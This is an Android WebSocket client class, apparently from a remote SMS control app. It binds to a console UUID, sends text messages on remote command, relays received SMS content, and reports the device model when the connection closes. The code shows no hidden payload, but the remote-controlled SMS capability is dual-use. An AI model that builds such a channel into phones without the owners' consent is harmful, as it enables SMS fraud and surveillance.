package com.lsper.client.websocket;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.graphics.Paint;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import com.google.gson.Gson;
import com.lsper.client.R;
import com.lsper.client.bean.Content;
import com.lsper.client.bean.Sms;

import org.java_websocket.WebSocket;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;

import kotlin.Unit;
import kotlin.time.DurationUnitKt;  

public class SocketClient extends org.java_websocket.client.WebSocketClient {



    Context context;
    public SocketClient(URI serverUri,Context context) {
        super(serverUri);
        this.context = context;
    }


    @Override
    public void onOpen(ServerHandshake handshakedata) {

    }

    @Override
    public void onMessage(String message) {
        Log.e("message",message);
        Gson gson = new Gson();
        Content content = gson.fromJson(message,Content.class);
        Log.e("msg",message);
        //服务器返回200 连接成功
        if (content.getType().equals("200")){
            Log.e("Conn","连接成功");
        }
        if (content.getOrigin().equals("console")|| content.getOrigin().equals("server")){
            client(content);
        }
        if (content.getOrigin().equals("client") || content.getOrigin().equals("server")){
            console(content);
        }






    }

    private void client(Content content){
        System.out.println(content.getType());
        //服务器发送bind请求 将控制端UUID写入本地
        if (content.getType().equals("bindConsole")){
            Log.e("bind","isbind");
            SharedPreferences.Editor spe = context.getSharedPreferences("UUID",Context.MODE_PRIVATE).edit();
            spe.putString("consoleUUID",content.getSenderUUID());
            spe.apply();
        }

        if (content.getType().equals("sendSMS")){
            //发送短信的操作
            Intent intent = new Intent();
            intent.setAction("com.smsManager.broadcast.SEND_SMS");
            intent.putExtra("sms",content.getContent());
            intent.setPackage(context.getPackageName());
            context.sendBroadcast(intent, Manifest.permission.SEND_SMS);

        }

    }

    private void console(Content content){
        //接收回报
        if (content.getType().equals("reply")){
            Log.e("reply",content.getContent());
        }
        //接收短信
        if (content.getType().equals("getSMS")){
            Log.e("sms","GetSms");
            Sms sms =new Gson().fromJson(content.getContent(),Sms.class);
            Log.e("sms",sms.getSmsContent());

        }
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        SharedPreferences spe = context.getSharedPreferences("UUID",Context.MODE_PRIVATE);
        String UUID = spe.getString("localUUID",null);
        String model = context.getSharedPreferences("model",Context.MODE_PRIVATE).getString("model",null);
        if (UUID!=null && model!=null) {
            Content content = new Content("isClose", "close", UUID, model);
            send(new Gson().toJson(content));
        }

    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
    }
}
